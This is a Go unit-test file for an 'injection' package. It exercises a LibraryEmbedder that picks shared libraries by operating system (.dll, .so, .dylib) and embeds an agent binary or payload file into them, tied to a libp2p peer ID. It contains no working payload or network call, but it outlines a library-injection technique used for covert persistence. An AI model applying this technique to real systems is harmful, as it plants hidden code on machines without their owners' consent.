package injection

import (
	"context"
	"log/slog"
	"os"
	"testing"
	"time"

	"github.com/libp2p/go-libp2p/core/peer"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

func TestNewLibraryEmbedder(t *testing.T) {
	logger := slog.Default()
	agentPath := "/test/agentd"
	peerID := peer.ID("test-peer")

	embedder := NewLibraryEmbedder(logger, agentPath, peerID)
	require.NotNil(t, embedder)
	assert.Equal(t, agentPath, embedder.agentPath)
	assert.Equal(t, peerID, embedder.peerID)
	assert.NotNil(t, embedder.embedChan)
}

func TestLibraryEmbedderStart(t *testing.T) {
	logger := slog.Default()
	agentPath := "/test/agentd"
	peerID := peer.ID("test-peer")

	embedder := NewLibraryEmbedder(logger, agentPath, peerID)
	require.NotNil(t, embedder)

	// Start the embedder
	ctx, cancel := context.WithTimeout(context.Background(), 100*time.Millisecond)
	defer cancel()

	embedder.Start(ctx)

	// Give it a moment to start
	time.Sleep(50 * time.Millisecond)

	// The embedder should be running without errors
	assert.NotNil(t, embedder)
}

func TestShouldTargetLibrary(t *testing.T) {
	embedder := &LibraryEmbedder{
		logger: slog.Default(),
	}

	// Test different library names based on OS
	switch os := os.Getenv("GOOS"); os {
	case "windows":
		assert.True(t, embedder.shouldTargetLibrary("test.dll"))
		assert.False(t, embedder.shouldTargetLibrary("test.exe"))
	case "darwin":
		assert.True(t, embedder.shouldTargetLibrary("test.dylib"))
		assert.True(t, embedder.shouldTargetLibrary("test.framework"))
		assert.False(t, embedder.shouldTargetLibrary("test.so"))
	default: // Linux and others
		assert.True(t, embedder.shouldTargetLibrary("test.so"))
		assert.False(t, embedder.shouldTargetLibrary("test.dll"))
	}
}

func TestRequestEmbedding(t *testing.T) {
	logger := slog.Default()
	agentPath := "/test/agentd"
	peerID := peer.ID("test-peer")

	embedder := NewLibraryEmbedder(logger, agentPath, peerID)
	require.NotNil(t, embedder)

	// Request embedding
	embedder.RequestEmbedding("test-library")

	// Check that the request was queued
	select {
	case library := <-embedder.embedChan:
		assert.Equal(t, "test-library", library)
	default:
		t.Error("Embedding request was not queued")
	}
}

func TestEmbedIntoLibraryWithPayload(t *testing.T) {
	logger := slog.Default()
	agentPath := "/test/agentd"
	peerID := peer.ID("test-peer")

	embedder := NewLibraryEmbedder(logger, agentPath, peerID)
	require.NotNil(t, embedder)

	// Create a temporary payload file
	payloadFile, err := os.CreateTemp("", "payload-*")
	require.NoError(t, err)
	defer os.Remove(payloadFile.Name())

	// Test embedding with payload
	err = embedder.EmbedIntoLibraryWithPayload("test-library", payloadFile.Name())
	assert.NoError(t, err)
}

func TestEmbedIntoLibraryWithNonexistentPayload(t *testing.T) {
	logger := slog.Default()
	agentPath := "/test/agentd"
	peerID := peer.ID("test-peer")

	embedder := NewLibraryEmbedder(logger, agentPath, peerID)
	require.NotNil(t, embedder)

	// Test embedding with nonexistent payload
	err := embedder.EmbedIntoLibraryWithPayload("test-library", "/nonexistent/payload")
	assert.Error(t, err)
	assert.Contains(t, err.Error(), "payload not found")
}